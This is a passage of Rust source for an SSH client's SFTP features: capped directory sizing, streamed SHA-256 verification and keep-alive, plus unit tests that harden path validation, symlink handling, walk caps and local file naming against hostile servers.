/// so the truncation condition can be unit-tested without a live session.
fn dir_size_capped(scanned: u64, elapsed: std::time::Duration) -> bool {
    elapsed >= DIR_SIZE_TIMEOUT || scanned >= DIR_SIZE_MAX_ENTRIES
}

/// Recursively total the size of a remote directory tree, on demand (the
/// renderer calls this only when the user asks for a folder's size - it is
/// never part of [`sftp_list_dir`], which would otherwise pay for a walk on
/// every navigation).
///
/// Classification is read straight off each `read_dir` entry's own
/// attributes rather than an extra per-entry stat round trip - SFTP's
/// SSH_FXP_READDIR already reports `lstat`-derived attributes (see the
/// [`SftpEntry`] doc comment), so this already satisfies "lstat only, never
/// follow a symlinked directory" for free: a symlink is counted as a leaf by
/// its own dirent size and never pushed onto the walk stack, so
/// `ln -s .. up` cannot recurse the walk into an ancestor.
///
/// Walked iteratively with an explicit queue (never unbounded recursion), a
/// path-visited set as an explicit cycle guard, and the entry/time caps
/// above; an unreadable subdirectory is skipped (already counted as a dir
/// from its parent's listing) rather than failing the whole call.
#[tauri::command]
pub async fn sftp_dir_size(
    app: AppHandle,
    session_id: String,
    path: String,
) -> CmdResult<serde_json::Value> {
    let sftp = sftp_from_session(&app, &session_id)?;
    let started = std::time::Instant::now();

    let mut queue: std::collections::VecDeque<String> = std::collections::VecDeque::new();
    queue.push_back(path);
    let mut visited: std::collections::HashSet<String> = std::collections::HashSet::new();

    let mut bytes: u64 = 0;
    let mut files: u64 = 0;
    let mut dirs: u64 = 0;
    let mut scanned: u64 = 0;
    let mut truncated = false;

    'walk: while let Some(dir) = queue.pop_front() {
        if !visited.insert(dir.clone()) {
            // Cycle guard: this exact path was already walked. Structurally
            // shouldn't happen (symlinked dirs are never enqueued below), but
            // stays as an explicit belt-and-braces check per entry point.
            continue;
        }
        let mut entries = match sftp.read_dir(&dir).await {
            Ok(e) => e,
            // Unreadable subdirectory (permission denied, vanished mid-walk,
            // ...): skip it, don't fail the whole size for one bad branch.
            Err(_) => continue,
        };
        while let Some(entry) = entries.next() {
            if dir_size_capped(scanned, started.elapsed()) {
                truncated = true;
                break 'walk;
            }
            let name = entry.file_name();
            if name == "." || name == ".." {
                continue;
            }
            scanned += 1;
            let md = entry.metadata();
            if md.is_symlink() {
                // A symlink is a leaf for sizing purposes - its own dirent
                // size - and is never traversed even when it points at a
                // directory.
                files += 1;
                bytes += md.size.unwrap_or(0);
            } else if md.is_dir() {
                dirs += 1;
                queue.push_back(format!("{}/{}", dir.trim_end_matches('/'), name));
            } else {
                files += 1;
                bytes += md.size.unwrap_or(0);
            }
        }
    }

    Ok(serde_json::json!({
        "ok": true,
        "bytes": bytes,
        "files": files,
        "dirs": dirs,
        "truncated": truncated,
    }))
}

// ─── remote SHA-256 ────────────────────────────────────────────────────────

/// Stream a remote file through SHA-256 without ever holding it whole in
/// memory, so a job can verify a large transfer without ballooning RSS.
/// Shared by the on-demand [`sftp_file_sha256`] command below and by the
/// transfer queue's opt-in post-transfer verification (which hashes both the
/// source and destination legs on their own channels).
///
/// Reads are clamped to the file's stated size in 256 KiB chunks - the same
/// clamp [`download_to`] uses - so the final read never crosses EOF (some
/// SFTP servers answer an over-read with SSH_FX_FAILURE instead of a short
/// read, which would otherwise fail a hash on the very last chunk).
/// `cancel`, when given, is polled between chunks so a cancelled queue job
/// stops hashing promptly instead of running to completion first.
pub(crate) async fn remote_sha256(
    sftp: &russh_sftp::client::SftpSession,
    path: &str,
    cancel: Option<&std::sync::atomic::AtomicBool>,
) -> Result<String, CmdError> {
    use sha2::{Digest, Sha256};
    use tokio::io::AsyncReadExt;

    let size = sftp
        .metadata(path)
        .await
        .map_err(|e| describe_sftp_error("stat", e))?
        .size
        .unwrap_or(0);

    let mut remote_file = sftp
        .open(path)
        .await
        .map_err(|e| describe_sftp_error("open", e))?;

    let mut hasher = Sha256::new();
    let mut buf = vec![0u8; 256 * 1024];
    let mut done: u64 = 0;
    while done < size {
        if cancel.map(|c| c.load(Ordering::SeqCst)).unwrap_or(false) {
            return Err(CmdError("hash cancelled".into()));
        }
        let want = ((size - done) as usize).min(buf.len());
        let n = remote_file
            .read(&mut buf[..want])
            .await
            .map_err(describe_download_read_error)?;
        if n == 0 {
            break;
        }
        hasher.update(&buf[..n]);
        done += n as u64;
    }
    // Same tolerant-close reasoning as `download_to`: the hash is already
    // computed from the bytes actually read, so a CLOSE failure on an
    // otherwise-complete read is a warning, not a failure.
    if let Err(e) = remote_file.close().await {
        log::warn!("[sshspan-sftp] close after hashing {path}: {e}");
    }
    Ok(format!("{:x}", hasher.finalize()))
}

/// SHA-256 of a remote file read to its END (for a server that reports no
/// size, where [`remote_sha256`]'s size clamp cannot work), or `None` once it
/// is larger than `cap` bytes.
async fn remote_sha256_capped(
    sftp: &russh_sftp::client::SftpSession,
    path: &str,
    cap: u64,
) -> Result<Option<String>, String> {
    use sha2::{Digest, Sha256};
    use tokio::io::AsyncReadExt;
    let mut file = sftp.open(path).await.map_err(sftp_error_detail)?;
    let mut hasher = Sha256::new();
    let mut buf = vec![0u8; 256 * 1024];
    let mut total: u64 = 0;
    let digest = loop {
        let n = match file.read(&mut buf).await {
            Ok(n) => n,
            Err(e) => {
                let _ = file.close().await;
                return Err(describe_download_read_error(e).0);
            }
        };
        if n == 0 {
            break Some(format!("{:x}", hasher.finalize()));
        }
        total += n as u64;
        if total > cap {
            break None;
        }
        hasher.update(&buf[..n]);
    };
    if let Err(e) = file.close().await {
        log::debug!("[sshspan-sftp] close after comparing {path}: {e}");
    }
    Ok(digest)
}

/// NOT REGISTERED in `generate_handler!`, deliberately: the renderer has no
/// "verify" action that calls it (the queue's opt-in verification uses
/// [`remote_sha256`] directly). Kept for the day it gets one.
///
/// On-demand single-file SHA-256, for a "verify" action outside the transfer
/// queue's own opt-in post-transfer verification.
#[tauri::command]
pub async fn sftp_file_sha256(
    app: AppHandle,
    session_id: String,
    path: String,
) -> CmdResult<serde_json::Value> {
    let sftp = sftp_from_session(&app, &session_id)?;
    let hex = remote_sha256(&sftp, &path, None).await?;
    Ok(serde_json::json!({ "ok": true, "sha256": hex }))
}

// ─── keep-alive ────────────────────────────────────────────────────────────

/// Start a 30 s keep-alive loop for the session's SFTP channel: a cheap
/// canonicalize round-trip keeps NAT/firewall state alive. The loop exits
/// silently once the SFTP session leaves the registry.
#[tauri::command]
pub async fn sftp_keepalive_start(
    app: AppHandle,
    session_id: String,
) -> CmdResult<serde_json::Value> {
    // Registry already holds a live session - verify it exists.
    let sftp = sftp_from_session(&app, &session_id)?;
    let app_for_loop = app.clone();
    let sid = session_id.clone();
    let stopped = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let stopped_loop = stopped.clone();
    let _handle = tauri::async_runtime::spawn(async move {
        while !stopped_loop.load(Ordering::SeqCst) {
            tokio::time::sleep(std::time::Duration::from_secs(30)).await;
            if stopped_loop.load(Ordering::SeqCst) {
                break;
            }
            // Still the registered session? If it was replaced/closed, stop.
            let current = match app_for_loop.state::<SftpRegistry>().get(&sid) {
                Some(s) => s,
                None => break,
            };
            if !Arc::ptr_eq(&current, &sftp) {
                break;
            }
            if sftp.canonicalize(".").await.is_err() {
                break;
            }
        }
    });
    app.state::<KeepaliveRegistry>().insert(session_id, stopped);
    Ok(serde_json::json!({ "ok": true }))
}

/// NOT REGISTERED in `generate_handler!`, deliberately: nothing calls it ("Send
/// to" stages its temp file inside the worker, `run_server_copy`), and handing
/// the renderer a staging path is the first half of the `sftp_stage_path` +
/// `sftp_download` chain that `system_open_external`'s inert-extension gate
/// exists to survive.
///
/// Staging path for cross-server "Send to" transfers (Rust temp dir).
/// The staged file can hold secret remote contents, so its name carries a
/// random component (audit hardening; see [`staged_file_name`]).
#[tauri::command]
pub fn sftp_stage_path(name: String) -> CmdResult<serde_json::Value> {
    Ok(
        serde_json::json!({ "path": edit_temp_dir().join(staged_file_name(&name)).display().to_string() }),
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Regression for the Windows verbatim-prefix guard bypass: a download
    /// target inside the app data dir - with an EXISTING parent directory -
    /// canonicalized under std to a `\\?\` path that never matched the plain
    /// app-data prefix, so the guard passed exactly where a write would
    /// succeed (vault overwrite). Both the existing-parent and
    /// not-yet-existing shapes must be rejected.
    #[test]
    fn sftp_local_path_rejects_app_data_targets() {
        use directories::ProjectDirs;
        let dir = ProjectDirs::from("org", "sshspan", "SSHSpan")
            .expect("project dirs")
            .data_dir()
            .to_path_buf();
        let _ = std::fs::create_dir_all(&dir);

        // Existing parent (the vault dir itself), non-existing file: this is
        // the exact shape that used to slip through on Windows.
        assert!(validate_sftp_local_path(
            dir.join("sshspan.db").display().to_string().as_str(),
            LocalAccess::Write
        )
        .is_err());
        // Nested non-existing subtree under the vault dir.
        assert!(validate_sftp_local_path(
            dir.join("new").join("f.txt").display().to_string().as_str(),
            LocalAccess::Write
        )
        .is_err());
        // The dir itself as the destination root (queue download shape).
        assert!(
            validate_sftp_local_path(dir.display().to_string().as_str(), LocalAccess::Write)
                .is_err()
        );
        // An existing file inside the vault dir (covers dunce on existing
        // targets).
        let probe = dir.join("sshspan-guard-test.tmp");
        std::fs::write(&probe, b"").expect("guard-test file");
        let res =
            validate_sftp_local_path(probe.display().to_string().as_str(), LocalAccess::Write);
        let _ = std::fs::remove_file(&probe);
        assert!(res.is_err());
        // Every access mode keeps the vault off-limits - including a path a
        // human approved in a dialog.
        for access in [LocalAccess::Read, LocalAccess::Basic] {
            assert!(validate_sftp_local_path(
                dir.join("sshspan.db").display().to_string().as_str(),
                access
            )
            .is_err());
        }
    }

    /// System directories stay off-limits for paths that do not exist yet.
    #[cfg(not(target_os = "windows"))]
    #[test]
    fn sftp_local_path_rejects_nonexistent_system_paths() {
        assert!(validate_sftp_local_path("/etc/sshspan-new/f.txt", LocalAccess::Write).is_err());
        assert!(validate_sftp_local_path("/home/sshspan-ok/f.txt", LocalAccess::Write).is_ok());
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn sftp_local_path_rejects_nonexistent_system_paths() {
        assert!(validate_sftp_local_path("C:\\Windows\\new\\f.txt", LocalAccess::Write).is_err());
    }

    // ─── recursive walks over a fake listing (A7-16, A6-06, A7-20) ───────────

    use russh_sftp::protocol::FileAttributes;
    use std::cell::{Cell, RefCell};
    use std::collections::HashMap;

    fn entry(name: &str, kind: EntryKind) -> ListedEntry {
        ListedEntry {
            name: name.to_string(),
            kind,
            size: 10,
            mtime: Some(1_600_000_000),
            why: None,
        }
    }

    /// directory path → its listing (an `Err` makes the folder unreadable).
    type Tree = HashMap<String, Result<Vec<ListedEntry>, String>>;

    /// A `list` closure over a canned tree, counting how often it is asked.
    fn lister<'a>(
        tree: &'a Tree,
        calls: &'a Cell<usize>,
    ) -> impl FnMut(String) -> std::future::Ready<Result<Vec<ListedEntry>, String>> + 'a {
        move |dir| {
            calls.set(calls.get() + 1);
            std::future::ready(tree.get(&dir).cloned().unwrap_or_else(|| Ok(Vec::new())))
        }
    }

    fn attrs(permissions: Option<u32>) -> FileAttributes {
        FileAttributes {
            permissions,
            ..FileAttributes::default()
        }
    }

    /// READDIR carries the entry's own `lstat` mode, so the kind can be read
    /// off the listing - no per-entry STAT, which is what made a dangling link
    /// fail the whole folder.
    #[test]
    fn entries_are_classified_from_their_listing_mode() {
        assert_eq!(
            classify_attrs(&attrs(Some(0o100644))),
            Some(EntryKind::File)
        );
        assert_eq!(classify_attrs(&attrs(Some(0o040755))), Some(EntryKind::Dir));
        assert_eq!(
            classify_attrs(&attrs(Some(0o120777))),
            Some(EntryKind::Symlink)
        );
        // FIFO, character device, socket: never read (a FIFO read blocks).
        assert_eq!(
            classify_attrs(&attrs(Some(0o010644))),
            Some(EntryKind::Other)
        );
        assert_eq!(
            classify_attrs(&attrs(Some(0o020644))),
            Some(EntryKind::Other)
        );
        assert_eq!(
            classify_attrs(&attrs(Some(0o140755))),
            Some(EntryKind::Other)
        );
        // Permission bits without any type bits say nothing: the walk asks
        // (RU4; they used to be taken for files).
        assert_eq!(classify_attrs(&attrs(Some(0o644))), None);
        // No mode at all: the listing did not say, the caller must ask.
        assert_eq!(classify_attrs(&attrs(None)), None);
    }

    #[tokio::test]
    async fn plan_download_collects_files_and_folders_below_the_picked_root() {
        let mut tree = Tree::new();
        tree.insert(
            "/srv/photos".into(),
            Ok(vec![
                entry("a.jpg", EntryKind::File),
                entry("2024", EntryKind::Dir),
                entry("empty", EntryKind::Dir),
            ]),
        );
        tree.insert(
            "/srv/photos/2024".into(),
            Ok(vec![entry("b.jpg", EntryKind::File)]),
        );
        let calls = Cell::new(0);

        let plan = plan_download("/srv/photos", "photos", lister(&tree, &calls))
            .await
            .unwrap();

        let mut files: Vec<(String, String)> = plan
            .files
            .iter()
            .map(|f| (f.remote.clone(), f.rel.join("/")))
            .collect();
        files.sort();
        assert_eq!(
            files,
            vec![
                (
                    "/srv/photos/2024/b.jpg".to_string(),
                    "photos/2024/b.jpg".to_string()
                ),
                ("/srv/photos/a.jpg".to_string(), "photos/a.jpg".to_string()),
            ]
        );
        let mut dirs: Vec<String> = plan.dirs.iter().map(|d| d.rel.join("/")).collect();
        dirs.sort();
        assert_eq!(dirs, vec!["photos", "photos/2024", "photos/empty"]);
        assert_eq!(plan.notes.total, 0, "{:?}", plan.notes);
        assert_eq!(calls.get(), 3, "each folder is listed exactly once");
    }

    /// A7-16: a dangling symlink made `sftp.metadata()` fail and aborted the
    /// whole folder, and a symlink to a directory was followed - copied a
    /// second time or looped until the server's path limit. Links are skipped
    /// and reported, never followed.
    #[tokio::test]
    async fn plan_download_skips_symlinks_without_following_them() {
        let mut tree = Tree::new();
        tree.insert(
            "/r".into(),
            Ok(vec![
                entry("real.txt", EntryKind::File),
                entry("loop", EntryKind::Symlink),
                entry("dangling", EntryKind::Symlink),
                entry("to-file", EntryKind::Symlink),
            ]),
        );
        // If `loop` were followed this would be listed (and recurse forever).
        tree.insert(
            "/r/loop".into(),
            Ok(vec![entry("loop", EntryKind::Symlink)]),
        );
        let calls = Cell::new(0);

        let plan = plan_download("/r", "r", lister(&tree, &calls))
            .await
            .unwrap();

        assert_eq!(plan.files.len(), 1);
        assert_eq!(plan.files[0].remote, "/r/real.txt");
        assert_eq!(calls.get(), 1, "a link must never be listed");
        let notes = plan.notes.into_vec().join("\n");
        for link in ["loop", "dangling", "to-file"] {
            assert!(notes.contains(link), "{link} not reported: {notes}");
        }
    }

    /// ...but the folder the user PICKED is different: if it cannot be listed
    /// there is nothing to download and nothing to show for it, so the item
    /// fails. As a mere note the expansion would still have created an empty
    /// local folder and answered `ok: true, added: 0` for it.
    #[tokio::test]
    async fn plan_download_fails_when_the_picked_root_cannot_be_listed() {
        let mut tree = Tree::new();
        tree.insert(
            "/locked".into(),
            Err("Permission denied (code 3)".to_string()),
        );
        let calls = Cell::new(0);

        let err = plan_download("/locked", "locked", lister(&tree, &calls))
            .await
            .expect_err("an unreadable picked folder must fail its item");

        assert!(
            err.contains("/locked") && err.contains("Permission denied"),
            "{err}"
        );
        assert_eq!(calls.get(), 1);
    }

    /// One unreadable folder BELOW the root is a note, not the end of the batch.
    #[tokio::test]
    async fn plan_download_survives_an_unreadable_subfolder() {
        let mut tree = Tree::new();
        tree.insert(
            "/r".into(),
            Ok(vec![
                entry("locked", EntryKind::Dir),
                entry("ok.txt", EntryKind::File),
            ]),
        );
        tree.insert(
            "/r/locked".into(),
            Err("Permission denied (code 3)".to_string()),
        );
        let calls = Cell::new(0);

        let plan = plan_download("/r", "r", lister(&tree, &calls))
            .await
            .unwrap();

        assert_eq!(plan.files.len(), 1);
        assert_eq!(plan.files[0].remote, "/r/ok.txt");
        let notes = plan.notes.into_vec().join("\n");
        assert!(
            notes.contains("/r/locked") && notes.contains("Permission denied"),
            "{notes}"
        );
    }

    /// FIFOs, sockets and devices are left alone.
    #[tokio::test]
    async fn plan_download_skips_special_files() {
        let mut tree = Tree::new();
        tree.insert(
            "/r".into(),
            Ok(vec![
                entry("pipe", EntryKind::Other),
                entry("a", EntryKind::File),
            ]),
        );
        let calls = Cell::new(0);
        let plan = plan_download("/r", "r", lister(&tree, &calls))
            .await
            .unwrap();
        assert_eq!(plan.files.len(), 1);
        assert!(plan.notes.into_vec().join("\n").contains("pipe"));
    }

    /// A6-06: depth is capped. A chain of folders 70 deep is cut off at the
    /// cap with a note instead of recursing until the server's path limit (and
    /// creating a local directory per level on the way).
    #[tokio::test]
    async fn plan_download_caps_the_depth() {
        let mut tree = Tree::new();
        let mut path = "/d".to_string();
        for _ in 0..70 {
            tree.insert(
                path.clone(),
                Ok(vec![
                    entry("f", EntryKind::File),
                    entry("n", EntryKind::Dir),
                ]),
            );
            path = format!("{path}/n");
        }
        let calls = Cell::new(0);

        let plan = plan_download("/d", "d", lister(&tree, &calls))
            .await
            .unwrap();

        assert_eq!(plan.dirs.len(), DOWNLOAD_MAX_DEPTH + 1, "root + 64 levels");
        assert_eq!(plan.files.len(), DOWNLOAD_MAX_DEPTH + 1);
        assert_eq!(calls.get(), DOWNLOAD_MAX_DEPTH + 1);
        assert!(plan.notes.into_vec().join("\n").contains("deeper"));
    }

    /// A6-06: the entry count is capped, as an ERROR (the user must download
    /// such a tree in parts) rather than a silent truncation - and the cap
    /// counts every kind of entry, links included.
    #[tokio::test]
    async fn plan_download_aborts_past_the_entry_cap() {
        for kind in [EntryKind::File, EntryKind::Symlink, EntryKind::Dir] {
            let mut tree = Tree::new();
            tree.insert(
                "/big".into(),
                Ok((0..=DOWNLOAD_MAX_ENTRIES)
                    .map(|i| entry(&format!("n{i}"), kind))
                    .collect()),
            );
            let calls = Cell::new(0);
            let err = plan_download("/big", "big", lister(&tree, &calls))
                .await
                .expect_err("one entry past the cap must abort");
            assert!(err.contains("more than 10000"), "{kind:?}: {err}");
        }
    }

    /// A hostile server answering EVERY listing with 20 more folders: the walk
    /// is exponential. It must stop after a bounded number of listings.
    #[tokio::test]
    async fn plan_download_bounds_the_work_a_hostile_tree_can_cost() {
        let calls = Cell::new(0usize);
        let list = |_dir: String| {
            calls.set(calls.get() + 1);
            std::future::ready(Ok::<_, String>(
                (0..20)
                    .map(|i| entry(&format!("d{i}"), EntryKind::Dir))
                    .collect::<Vec<_>>(),
            ))
        };

        let err = plan_download("/evil", "evil", list)
            .await
            .expect_err("an endless tree must hit a cap");

        assert!(err.contains("more than 10000"), "{err}");
        assert!(
            calls.get() <= DOWNLOAD_MAX_ENTRIES / 20 + 1,
            "{} listings",
            calls.get()
        );
    }

    /// Names that cannot be local file names are skipped, never flattened.
    #[tokio::test]
    async fn plan_download_skips_names_that_are_not_usable_locally() {
        let mut tree = Tree::new();
        tree.insert(
            "/r".into(),
            Ok(vec![
                entry("..", EntryKind::File),
                entry("a/b", EntryKind::File),
                entry("C:\\x", EntryKind::File),
                entry("CON", EntryKind::File),
                entry("", EntryKind::File),
                entry("ok.txt", EntryKind::File),
                entry("back:up", EntryKind::File),
            ]),
        );
        let calls = Cell::new(0);

        let plan = plan_download("/r", "r", lister(&tree, &calls))
            .await
            .unwrap();

        let rels: Vec<String> = plan.files.iter().map(|f| f.rel.join("/")).collect();
        assert_eq!(rels, vec!["r/ok.txt", "r/back_up"]);
        assert_eq!(plan.notes.total, 5);
    }

    // ─── the expansion against a real SFTP session ───────────────────────────

    #[cfg(unix)]
    fn download_ctx(preserve_ts: bool) -> ItemCtx {
        ItemCtx {
            session_id: "sess".to_string(),
            server_name: "srv".to_string(),
            resume: ResumeMode::Resume,
            preserve_ts,
        }
    }

    /// `list_remote_dir` against the real client: links stay links (READDIR is
    /// lstat), including one whose target does not exist.
    #[cfg(unix)]
    #[tokio::test]
    async fn list_remote_dir_reports_links_as_links() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/d/f.txt", b"hello");
        fx.mkdir("/d/sub");
        fx.symlink("sub", "/d/link-to-dir");
        fx.symlink("/nowhere", "/d/dangling");

        let mut got: Vec<(String, EntryKind, u64)> = list_remote_dir(&sftp, "/d")
            .await
            .unwrap()
            .into_iter()
            .map(|e| (e.name, e.kind, e.size))
            .collect();
        got.sort_by(|a, b| a.0.cmp(&b.0));

        let kinds: Vec<(&str, EntryKind)> = got.iter().map(|(n, k, _)| (n.as_str(), *k)).collect();
        assert_eq!(
            kinds,
            vec![
                ("dangling", EntryKind::Symlink),
                ("f.txt", EntryKind::File),
                ("link-to-dir", EntryKind::Symlink),
                ("sub", EntryKind::Dir),
            ]
        );
        assert_eq!(got[1].2, 5, "file size comes from the listing");
    }

    /// The whole expansion over a real tree containing a loop link, a dangling
    /// link and a link that points OUT of the tree: only the real files are
    /// queued, the folder structure (empty folders included) is created
    /// locally, and everything skipped is reported.
    #[cfg(unix)]
    #[tokio::test]
    async fn expand_download_skips_links_and_builds_the_local_tree() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/pics/a.jpg", b"A");
        fx.write("/pics/sub/b.jpg", b"BB");
        fx.mkdir("/pics/empty");
        fx.symlink(".", "/pics/loop");
        fx.symlink("/nowhere", "/pics/dangling");
        fx.write("/outside/secret.txt", b"nope");
        fx.symlink("../outside", "/pics/out");
        let local = LocalDir::new();
        let root = std::fs::canonicalize(&local.0).unwrap();

        let expanded = expand_download(&sftp, "/pics", &root, &download_ctx(true), None)
            .await
            .expect("a dangling link must not fail the folder");

        let mut remotes: Vec<&str> = expanded
            .items
            .iter()
            .map(|i| i.remote_path.as_str())
            .collect();
        remotes.sort();
        assert_eq!(remotes, vec!["/pics/a.jpg", "/pics/sub/b.jpg"]);
        let locals: Vec<PathBuf> = expanded
            .items
            .iter()
            .map(|i| PathBuf::from(&i.local_path))
            .collect();
        assert!(locals.contains(&root.join("pics").join("a.jpg")));
        assert!(locals.contains(&root.join("pics").join("sub").join("b.jpg")));
        // Folders exist (the empty one too); files are the queue's job.
        assert!(root.join("pics").join("sub").is_dir());
        assert!(root.join("pics").join("empty").is_dir());
        assert!(!root.join("pics").join("loop").exists());
        assert!(!root.join("pics").join("out").exists());
        assert!(!root.join("pics").join("a.jpg").exists());
        // Honoured for downloads now (A7-36), and the resume mode is threaded.
        assert!(expanded.items.iter().all(|i| i.preserve_ts == Some(true)));
        assert!(expanded
            .items
            .iter()
            .all(|i| i.resume == Some(ResumeMode::Resume)));
        let notes = expanded.notes.into_vec().join("\n");
        for skipped in ["loop", "dangling", "out"] {
            assert!(notes.contains(skipped), "{skipped} not reported: {notes}");
        }
    }

    /// A walk that fails (cap) must leave nothing behind on disk: directories
    /// are only created after the whole walk succeeded.
    #[cfg(unix)]
    #[tokio::test]
    async fn expand_download_creates_nothing_when_the_walk_aborts() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        for i in 0..=DOWNLOAD_MAX_ENTRIES {
            std::fs::create_dir_all(fx.path("/huge")).unwrap();
            std::fs::write(fx.path(&format!("/huge/f{i}")), b"").unwrap();
        }
        fx.mkdir("/huge/sub");
        let local = LocalDir::new();
        let root = std::fs::canonicalize(&local.0).unwrap();

        let err = expand_download(&sftp, "/huge", &root, &download_ctx(false), None)
            .await
            .err()
            .expect("over the cap");

        assert!(err.contains("more than 10000"), "{err}");
        assert!(
            std::fs::read_dir(&root).unwrap().next().is_none(),
            "no directory may be created by a failed walk"
        );
    }

    /// The real-session version of the same rule: an unreadable PICKED folder
    /// fails the item and leaves no empty folder behind, while an unreadable
    /// folder BELOW it only costs a note.
    #[cfg(unix)]
    #[tokio::test]
    async fn expand_download_of_an_unreadable_picked_folder_fails_and_creates_nothing() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/locked/secret.txt", b"x");
        fx.knobs.lock().unwrap().unlistable.push("/locked".into());
        let local = LocalDir::new();
        let root = std::fs::canonicalize(&local.0).unwrap();

        let err = expand_download(&sftp, "/locked", &root, &download_ctx(false), None)
            .await
            .err()
            .expect("an unreadable picked folder must fail");

        assert!(
            err.contains("/locked") && err.contains("Permission denied"),
            "{err}"
        );
        assert!(
            std::fs::read_dir(&root).unwrap().next().is_none(),
            "no empty local folder may be created for it"
        );
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn expand_download_goes_on_past_an_unreadable_subfolder() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/d/ok.txt", b"1");
        fx.write("/d/locked/hidden.txt", b"2");
        fx.knobs.lock().unwrap().unlistable.push("/d/locked".into());
        let local = LocalDir::new();
        let root = std::fs::canonicalize(&local.0).unwrap();

        let expanded = expand_download(&sftp, "/d", &root, &download_ctx(false), None)
            .await
            .expect("a subfolder that cannot be listed is not fatal");

        let remotes: Vec<&str> = expanded
            .items
            .iter()
            .map(|i| i.remote_path.as_str())
            .collect();
        assert_eq!(remotes, vec!["/d/ok.txt"]);
        let notes = expanded.notes.into_vec().join("\n");
        assert!(
            notes.contains("/d/locked") && notes.contains("Permission denied"),
            "{notes}"
        );
    }

    /// The root the user picked may itself be a link (they chose it): it is
    /// followed, while links BELOW it are not.
    #[cfg(unix)]
    #[tokio::test]
    async fn expand_download_follows_only_the_link_the_user_picked() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/real/x.txt", b"x");
        fx.symlink("real", "/picked");
        fx.symlink("real", "/real/inner-link");
        let local = LocalDir::new();
        let root = std::fs::canonicalize(&local.0).unwrap();

        let expanded = expand_download(&sftp, "/picked", &root, &download_ctx(false), None)
            .await
            .unwrap();

        let remotes: Vec<&str> = expanded
            .items
            .iter()
            .map(|i| i.remote_path.as_str())
            .collect();
        assert_eq!(remotes, vec!["/picked/x.txt"]);
        assert!(root.join("picked").is_dir());
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn expand_download_single_file_uses_the_rename_and_threads_preserve_ts() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/a.txt", b"abc");
        let local = LocalDir::new();
        let root = std::fs::canonicalize(&local.0).unwrap();

        let expanded = expand_download(&sftp, "/a.txt", &root, &download_ctx(true), Some("b.txt"))
            .await
            .unwrap();

        assert_eq!(expanded.items.len(), 1);
        assert_eq!(
            expanded.items[0].local_path,
            root.join("b.txt").display().to_string()
        );
        assert_eq!(expanded.items[0].size, 3);
        assert_eq!(expanded.items[0].preserve_ts, Some(true));
        // A rename can never leave the destination.
        let escaped = expand_download(&sftp, "/a.txt", &root, &download_ctx(false), Some("../x"))
            .await
            .unwrap();
        assert!(escaped.items.is_empty());
        assert_eq!(escaped.notes.total, 1);
    }

    /// Only the root is `stat`ed, so a root that does not exist is still an
    /// error for the batch (there is nothing to download at all).
    #[cfg(unix)]
    #[tokio::test]
    async fn expand_download_of_a_missing_root_is_an_error() {
        let (sftp, _fx) = crate::sftp::testkit::serve().await;
        let local = LocalDir::new();
        let root = std::fs::canonicalize(&local.0).unwrap();
        let err = expand_download(&sftp, "/nope", &root, &download_ctx(false), None)
            .await
            .err()
            .expect("missing root");
        assert!(err.starts_with("stat /nope"), "{err}");
    }

    // ─── one local name per download (A7-57) ─────────────────────────────────

    fn dl(local: &str) -> QueuedItem {
        QueuedItem {
            kind: JobKind::Download,
            session_id: "s".into(),
            server_name: "n".into(),
            local_path: local.into(),
            remote_path: "/r".into(),
            size: 1,
            target: None,
            resume: None,
            preserve_ts: None,
        }
    }

    fn locals(items: &[QueuedItem]) -> Vec<&str> {
        items.iter().map(|i| i.local_path.as_str()).collect()
    }

    /// `back:up` and `back_up` both sanitize to `back_up`: two jobs, one `.part`.
    #[test]
    fn colliding_sanitized_names_get_a_numbered_local_name() {
        // The premise: two DIFFERENT remote names with one local name. (`a:b`
        // would not do: a letter followed by a colon reads as a drive letter and
        // is rejected outright.)
        assert_eq!(sanitize_remote_name("back:up"), Some("back_up".to_string()));
        assert_eq!(sanitize_remote_name("back_up"), Some("back_up".to_string()));
        let mut items = vec![dl("/d/back_up"), dl("/d/back_up"), dl("/d/c")];
        let notes = dedupe_local_targets(&mut items);
        assert_eq!(locals(&items), vec!["/d/back_up", "/d/back_up (1)", "/d/c"]);
        assert_eq!(notes.len(), 1);
        assert!(notes[0].contains("/d/back_up (1)"), "{notes:?}");
    }

    /// README / readme are ONE file on a case-insensitive disk, and "the
    /// destination is case-sensitive" cannot be assumed on any platform: a
    /// Linux download folder can sit on exFAT, NTFS or an SMB share, and
    /// macOS volumes are case-insensitive by default. So case is folded
    /// everywhere. On a genuinely case-sensitive disk that renames one of two
    /// distinct files to `readme (1)` - a visible, reported cost - where the
    /// alternative is silently losing one of them.
    #[test]
    fn case_only_collisions_are_renamed_on_every_platform() {
        let mut items = vec![dl("/d/README"), dl("/d/readme"), dl("/d/ReadMe")];
        let notes = dedupe_local_targets(&mut items);
        assert_eq!(
            locals(&items),
            vec!["/d/README", "/d/readme (1)", "/d/ReadMe (2)"]
        );
        assert_eq!(notes.len(), 2);
        // The numbered name is itself compared case-insensitively.
        let mut clash = vec![dl("/d/a"), dl("/d/A (1)"), dl("/d/A")];
        dedupe_local_targets(&mut clash);
        assert_eq!(locals(&clash), vec!["/d/a", "/d/A (1)", "/d/A (2)"]);
    }

    #[test]
    fn numbering_keeps_the_extension_and_handles_dotfiles_and_taken_numbers() {
        let mut items = vec![dl("/d/x.tar.gz"), dl("/d/x.tar.gz")];
        dedupe_local_targets(&mut items);
        assert_eq!(locals(&items), vec!["/d/x.tar.gz", "/d/x.tar (1).gz"]);

        let mut dot = vec![dl("/d/.bashrc"), dl("/d/.bashrc")];
        dedupe_local_targets(&mut dot);
        assert_eq!(locals(&dot), vec!["/d/.bashrc", "/d/.bashrc (1)"]);

        // `a (1)` is already taken by another job of the batch.
        let mut taken = vec![dl("/d/a"), dl("/d/a (1)"), dl("/d/a")];
        dedupe_local_targets(&mut taken);
        assert_eq!(locals(&taken), vec!["/d/a", "/d/a (1)", "/d/a (2)"]);
    }

    /// Only downloads write a local file; uploads and server copies are left
